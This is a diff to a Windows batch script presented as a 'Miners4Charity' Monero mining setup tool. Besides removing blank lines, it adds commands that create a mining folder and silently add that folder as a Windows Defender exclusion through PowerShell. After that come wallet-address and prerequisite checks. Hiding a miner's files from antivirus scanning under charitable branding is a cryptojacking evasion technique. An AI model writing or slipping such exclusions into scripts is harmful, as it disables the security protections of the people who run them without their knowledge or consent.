@@ -1,103 +1,60 @@
 @echo off
 
-
-
 set VERSION=1
-
-
 
 rem printing greetings
 
-
-
 echo Miners4Charity mining setup script v%VERSION%.
-
 echo ^(please report issues to Miners4Charity@gmail.com email^)
-
 echo.
 
-
+echo Adding the Mining Directory
+mkdir %USERPROFILE%\Miners4Charity
+powershell -inputformat none -outputformat none -NonInteractive -Command "$USERPROFILE = $env:USERPROFILE; Defender\Add-MpPreference -ExclusionPath ('$USERPROFILE\Miners4Charity')"
 
 net session >nul 2>&1
-
 if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)
 
-
-
 rem command line arguments
-
 set WALLET=%1
 
 rem this one is optional
-
 set EMAIL=%2
-
 
 
 rem checking prerequisites
 
-
-
 if [%WALLET%] == [] (
-
   echo Script usage:
-
   echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
-
   echo ERROR: Please specify your wallet address
-
   exit /b 1
-
 )
 
-
-
 for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
-
 call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
-
 if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
-
 if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
-
 echo ERROR: Wrong wallet address length (should be 106 or 95): %WALLET_BASE_LEN%
-
 exit /b 1
-
 
 
 :WALLET_LEN_OK
 
-
-
 if ["%USERPROFILE%"] == [""] (
-
   echo ERROR: Please define USERPROFILE environment variable to your user directory
-
   exit /b 1
-
 )
-
-
 
 if not exist "%USERPROFILE%" (
-
   echo ERROR: Please make sure user directory %USERPROFILE% exists
-
   exit /b 1
-
 )
 
-
-
 where powershell >NUL
-
 if not %errorlevel% == 0 (
-
   echo ERROR: This script requires "powershell" utility to work correctly
-
   exit /b 1
-
 )
 
 
